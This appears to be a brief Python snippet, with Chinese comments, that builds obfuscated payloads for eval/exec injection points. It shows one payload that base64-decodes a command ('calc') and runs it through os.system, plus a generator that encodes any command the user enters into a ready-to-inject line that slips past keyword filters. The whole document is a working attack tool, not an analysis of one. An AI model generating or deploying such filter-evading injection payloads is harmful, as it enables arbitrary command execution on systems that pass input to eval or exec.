#by leeya_bug

#混淆版不包含敏感命令
#适用于eval、exec等函数

#Payload: 
if False:
    __import__('os').system(__import__('base64').b64decode('Y2FsYw==').decode())


#Payload生成
import base64
cmd = input('请输入命令: ')
a = base64.b64encode(cmd.encode()).decode()
print(f'''__import__('os').system(__import__('base64').b64decode('{a}').decode())''')
